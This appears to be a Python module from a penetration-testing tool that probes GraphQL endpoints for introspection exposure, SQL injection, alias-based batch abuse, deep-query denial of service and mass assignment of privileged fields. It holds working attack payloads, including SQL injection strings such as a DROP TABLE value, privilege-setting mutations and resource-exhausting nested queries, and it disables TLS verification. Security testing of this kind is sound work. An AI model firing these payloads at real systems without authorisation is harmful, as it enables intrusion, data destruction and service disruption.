"""GraphQL Security Analyzer — Task 19.1 (Sprint 19).

Comprehensive GraphQL vulnerability detection:
  1. Introspection enabled — schema exposure
  2. SQL injection via GraphQL arguments
  3. Batch query attack (alias abuse) — rate-limit bypass
  4. Deep query DoS — nested query resource exhaustion
  5. Mass assignment via mutations — privilege escalation
  6. Endpoint discovery — probe common GraphQL paths

Usage:
    from pentra_tools.vuln.graphql_analyzer import analyze_graphql_endpoint

    findings = await analyze_graphql_endpoint("https://target.com/graphql")
"""

from __future__ import annotations

import asyncio
import logging
import re
import time
from dataclasses import dataclass, field

import httpx

logger = logging.getLogger(__name__)

# ── Common GraphQL endpoint paths ─────────────────────────────────────────────

GRAPHQL_PATHS = [
    "/graphql",
    "/api/graphql",
    "/v1/graphql",
    "/v2/graphql",
    "/query",
    "/api/query",
    "/gql",
    "/graphiql",
    "/playground",
    "/api",
    "/graphql/v1",
]

# SQL error signals — same as vuln_hunt_node
SQL_ERROR_SIGNALS = [
    "sql syntax", "mysql error", "syntax error",
    "ora-", "mssql", "unclosed quotation", "pg::syntaxerror",
    "quoted string not properly terminated", "you have an error in your sql",
    "microsoft ole db", "sqlexception",
]


# ── Data models ───────────────────────────────────────────────────────────────

@dataclass
class GraphQLFinding:
    """A confirmed GraphQL security finding."""
    title: str
    severity: str           # critical/high/medium/low/info
    vuln_class: str
    endpoint: str
    description: str
    request_payload: str = ""
    response_snippet: str = ""
    evidence: str = ""
    remediation: str = ""

    def to_dict(self) -> dict:
        return {
            "title": self.title,
            "severity": self.severity,
            "vuln_class": self.vuln_class,
            "target_url": self.endpoint,
            "description": self.description,
            "request_raw": self.request_payload,
            "response_raw": self.response_snippet,
            "source": "graphql_analyzer",
            "remediation": self.remediation,
        }


# ── Endpoint discovery ────────────────────────────────────────────────────────

async def detect_graphql_endpoints(
    base_url: str,
    client: httpx.AsyncClient,
    auth_headers: dict | None = None,
) -> list[str]:
    """Probe common paths to find live GraphQL endpoints.

    Returns list of confirmed GraphQL endpoint URLs.
    """
    base = base_url.rstrip("/")
    headers = {"Content-Type": "application/json", **(auth_headers or {})}
    # Minimal introspection probe
    probe_query = '{"query": "{ __typename }"}'
    found: list[str] = []

    for path in GRAPHQL_PATHS:
        url = f"{base}{path}"
        try:
            resp = await client.post(url, content=probe_query.encode(), headers=headers, timeout=5.0)
            if resp.status_code == 200:
                ct = resp.headers.get("content-type", "")
                body = resp.text.lower()
                if "application/json" in ct or "graphql" in ct:
                    try:
                        data = resp.json()
                        # Confirmed: has data or errors key typical of GraphQL
                        if "data" in data or "errors" in data:
                            found.append(url)
                            logger.info("[graphql] Endpoint found: %s", url)
                            continue
                    except Exception:
                        pass
                # Fallback: look for GraphQL-specific patterns in body
                if "__typename" in body or "graphql" in body or "introspection" in body:
                    found.append(url)
                    logger.info("[graphql] Endpoint found (heuristic): %s", url)
        except Exception:
            pass

    return found


# ── Schema extraction ─────────────────────────────────────────────────────────

_INTROSPECTION_QUERY = """
{
  __schema {
    queryType { name }
    mutationType { name }
    types {
      name
      fields {
        name
        args { name type { name } }
      }
    }
  }
}
"""


async def extract_schema(
    endpoint: str,
    client: httpx.AsyncClient,
    auth_headers: dict | None = None,
) -> dict | None:
    """Run introspection query and return parsed schema dict, or None if disabled."""
    headers = {"Content-Type": "application/json", **(auth_headers or {})}
    try:
        resp = await client.post(
            endpoint,
            json={"query": _INTROSPECTION_QUERY},
            headers=headers,
            timeout=10.0,
        )
        data = resp.json()
        schema = data.get("data", {}).get("__schema")
        if schema:
            return schema
        # Check if introspection is explicitly disabled
        errors = data.get("errors", [])
        if errors:
            msg = errors[0].get("message", "").lower()
            if "introspection" in msg or "disabled" in msg:
                return None
    except Exception as exc:
        logger.debug("[graphql] extract_schema failed: %s", exc)
    return None


def parse_schema(schema: dict) -> tuple[list[str], list[str]]:
    """Extract query and mutation names from a raw schema dict.

    Returns (queries: list[str], mutations: list[str]).
    """
    if not schema:
        return [], []

    query_type_name = (schema.get("queryType") or {}).get("name", "Query")
    mutation_type_name = (schema.get("mutationType") or {}).get("name", "Mutation")

    queries: list[str] = []
    mutations: list[str] = []

    for type_def in schema.get("types", []):
        name = type_def.get("name", "")
        fields = type_def.get("fields") or []
        field_names = [f.get("name", "") for f in fields if f.get("name")]
        if name == query_type_name:
            queries.extend(field_names)
        elif name == mutation_type_name:
            mutations.extend(field_names)

    return queries, mutations


# ── Security tests ────────────────────────────────────────────────────────────

async def test_introspection_enabled(
    endpoint: str,
    schema: dict | None,
) -> GraphQLFinding | None:
    """Return a finding if introspection is enabled (schema is not None)."""
    if schema is None:
        return None

    types_count = len(schema.get("types", []))
    return GraphQLFinding(
        title="GraphQL Introspection Enabled",
        severity="low",
        vuln_class="INFORMATION_DISCLOSURE",
        endpoint=endpoint,
        description=(
            f"GraphQL introspection is enabled, exposing the full schema "
            f"({types_count} types). Attackers can enumerate all queries, "
            "mutations, and fields to identify attack surface."
        ),
        request_payload=_INTROSPECTION_QUERY.strip(),
        response_snippet=str(schema)[:300],
        evidence=f"Schema exposed: {types_count} types, queries and mutations visible",
        remediation=(
            "Disable introspection in production. In most GraphQL servers: "
            "set introspection=False. Allow only in development environments."
        ),
    )


async def test_sqli_via_graphql(
    endpoint: str,
    client: httpx.AsyncClient,
    queries: list[str],
    auth_headers: dict | None = None,
) -> list[GraphQLFinding]:
    """Test SQL injection via GraphQL string arguments."""
    if not queries:
        return []

    findings: list[GraphQLFinding] = []
    headers = {"Content-Type": "application/json", **(auth_headers or {})}
    sqli_payloads = ["' OR 1=1--", "'; DROP TABLE users--", "1 AND 1=2--"]

    for query_name in queries[:5]:  # cap at 5 queries
        for payload in sqli_payloads[:2]:
            gql_query = f'{{ {query_name}(id: "{payload}") {{ id }} }}'
            try:
                resp = await client.post(
                    endpoint,
                    json={"query": gql_query},
                    headers=headers,
                    timeout=8.0,
                )
                body_lower = resp.text.lower()
                found_errors = [sig for sig in SQL_ERROR_SIGNALS if sig in body_lower]
                if found_errors:
                    findings.append(GraphQLFinding(
                        title=f"SQL Injection via GraphQL — {query_name}",
                        severity="critical",
                        vuln_class="SQL_INJECTION",
                        endpoint=endpoint,
                        description=(
                            f"SQL injection confirmed via GraphQL query '{query_name}'. "
                            f"SQL error detected: {found_errors[0]!r}. "
                            "Attacker can extract or modify database contents."
                        ),
                        request_payload=gql_query,
                        response_snippet=resp.text[:300],
                        evidence=f"SQL error signal: {found_errors[0]!r}",
                        remediation=(
                            "Use parameterised queries in resolvers. "
                            "Never interpolate user input directly into SQL. "
                            "Use ORM bound parameters."
                        ),
                    ))
                    break  # one finding per query
            except Exception as exc:
                logger.debug("[graphql] sqli test failed: %s", exc)

    return findings


async def test_batch_query_attack(
    endpoint: str,
    client: httpx.AsyncClient,
    queries: list[str],
    auth_headers: dict | None = None,
) -> GraphQLFinding | None:
    """Test alias-based batch query attack (rate-limit bypass)."""
    if not queries:
        return None

    query_name = queries[0]
    aliases = "\n".join(f"q{i}: {query_name}(id: {i}) {{ id }}" for i in range(1, 51))
    batch_query = f"{{ {aliases} }}"
    headers = {"Content-Type": "application/json", **(auth_headers or {})}

    try:
        resp = await client.post(
            endpoint,
            json={"query": batch_query},
            headers=headers,
            timeout=15.0,
        )
        data = resp.json()
        successful = sum(1 for k in data.get("data", {}) if k.startswith("q"))

        if successful >= 10:
            return GraphQLFinding(
                title="GraphQL Batch Query Attack (Alias Abuse)",
                severity="medium",
                vuln_class="BUSINESS_LOGIC",
                endpoint=endpoint,
                description=(
                    f"GraphQL endpoint allows batch queries via aliases without rate limiting. "
                    f"Sent 50 aliases, received {successful} successful responses. "
                    "This can be abused for brute force attacks in a single HTTP request, "
                    "bypassing traditional rate limiting."
                ),
                request_payload=batch_query[:300],
                response_snippet=str(data)[:200],
                evidence=f"{successful}/50 batch queries succeeded",
                remediation=(
                    "Implement query depth/alias limits. "
                    "Use libraries like graphql-cost-analysis or graphql-depth-limit."
                ),
            )
    except Exception as exc:
        logger.debug("[graphql] batch test failed: %s", exc)

    return None


async def test_deep_query_dos(
    endpoint: str,
    client: httpx.AsyncClient,
    auth_headers: dict | None = None,
) -> GraphQLFinding | None:
    """Test deep/circular query that could cause DoS."""
    deep_query = "{ user { " + "friends { " * 10 + "id name " + "} " * 10 + "} }"
    headers = {"Content-Type": "application/json", **(auth_headers or {})}

    try:
        t0 = time.monotonic()
        resp = await client.post(
            endpoint,
            json={"query": deep_query},
            headers=headers,
            timeout=20.0,
        )
        elapsed = time.monotonic() - t0

        if elapsed > 5.0 and resp.status_code == 200:
            return GraphQLFinding(
                title="GraphQL Deep Query DoS",
                severity="medium",
                vuln_class="DENIAL_OF_SERVICE",
                endpoint=endpoint,
                description=(
                    f"GraphQL endpoint processed a 10-level deep nested query in {elapsed:.1f}s "
                    "without blocking. Deeply nested queries consume exponential server resources."
                ),
                request_payload=deep_query,
                response_snippet=resp.text[:200],
                evidence=f"Deep query (10 levels) took {elapsed:.1f}s without rate limiting",
                remediation="Implement query depth limiting and query complexity analysis.",
            )
    except asyncio.TimeoutError:
        return GraphQLFinding(
            title="GraphQL Deep Query DoS (Timeout)",
            severity="low",
            vuln_class="DENIAL_OF_SERVICE",
            endpoint=endpoint,
            description="Deep nested GraphQL query caused server timeout.",
            request_payload=deep_query,
            response_snippet="Timed out after 20s",
            evidence="Server timed out on deep nested query",
            remediation="Implement query depth limiting.",
        )
    except Exception as exc:
        logger.debug("[graphql] deep query test failed: %s", exc)

    return None


async def test_mass_assignment_via_mutation(
    endpoint: str,
    client: httpx.AsyncClient,
    mutations: list[str],
    auth_headers: dict | None = None,
) -> list[GraphQLFinding]:
    """Test mass assignment via GraphQL mutations — privilege escalation."""
    findings: list[GraphQLFinding] = []
    headers = {"Content-Type": "application/json", **(auth_headers or {})}

    PRIVILEGED_FIELDS = [
        "role", "isAdmin", "is_admin", "admin", "permission",
        "subscription", "credits", "balance", "verified",
    ]

    for mutation_name in mutations[:5]:
        for field_name in PRIVILEGED_FIELDS[:4]:  # cap for speed
            mutation = f"""
mutation {{
  {mutation_name}(input: {{
    {field_name}: true
  }}) {{
    id
  }}
}}
"""
            try:
                resp = await client.post(
                    endpoint,
                    json={"query": mutation},
                    headers=headers,
                    timeout=10.0,
                )
                data = resp.json()
                if "data" in data and not data.get("errors"):
                    findings.append(GraphQLFinding(
                        title=f"Mass Assignment via GraphQL Mutation — {mutation_name}.{field_name}",
                        severity="high",
                        vuln_class="BROKEN_ACCESS_CONTROL",
                        endpoint=endpoint,
                        description=(
                            f"GraphQL mutation '{mutation_name}' accepted privileged field "
                            f"'{field_name}' without validation. This may allow privilege escalation."
                        ),
                        request_payload=mutation.strip(),
                        response_snippet=str(data)[:200],
                        evidence=f"Mutation accepted privileged field: {field_name}",
                        remediation=(
                            "Use explicit input types in GraphQL mutations. "
                            "Never use generic object input — define exactly which fields are allowed."
                        ),
                    ))
            except Exception:
                pass

    return findings


# ── Main entry point ──────────────────────────────────────────────────────────

async def analyze_graphql_endpoint(
    endpoint: str,
    auth_headers: dict | None = None,
    scope_check_fn=None,
) -> list[dict]:
    """Run comprehensive GraphQL security analysis.

    Returns list of finding dicts compatible with Pentra AI finding format.

    Args:
        endpoint:       Full URL of the GraphQL endpoint.
        auth_headers:   Optional auth headers (Bearer, Cookie, etc.).
        scope_check_fn: Optional callable(url) -> bool for scope enforcement.
    """
    if scope_check_fn and not scope_check_fn(endpoint):
        logger.warning("[graphql] %s out of scope — skipping", endpoint)
        return []

    findings: list[GraphQLFinding] = []

    async with httpx.AsyncClient(
        verify=False,  # noqa: S501
        timeout=15.0,
        follow_redirects=True,
    ) as client:
        # Step 1: Extract schema (introspection)
        schema = await extract_schema(endpoint, client, auth_headers)
        queries, mutations = ([], [])
        if schema:
            queries, mutations = parse_schema(schema)
            logger.info("[graphql] Schema: %d queries, %d mutations", len(queries), len(mutations))

        # Step 2: Run security tests concurrently
        results = await asyncio.gather(
            test_sqli_via_graphql(endpoint, client, queries, auth_headers),
            test_batch_query_attack(endpoint, client, queries, auth_headers),
            test_deep_query_dos(endpoint, client, auth_headers),
            test_mass_assignment_via_mutation(endpoint, client, mutations, auth_headers),
            return_exceptions=True,
        )

        # Step 3: Introspection finding (non-concurrent — uses schema result)
        introspection_finding = await test_introspection_enabled(endpoint, schema)
        if introspection_finding:
            findings.append(introspection_finding)

        # Step 4: Collect all findings
        for result in results:
            if isinstance(result, Exception):
                logger.warning("[graphql] Test error: %s", result)
            elif isinstance(result, list):
                findings.extend(result)
            elif result is not None:
                findings.append(result)

    logger.info("[graphql] Analysis complete: %d findings at %s", len(findings), endpoint)
    return [f.to_dict() for f in findings]
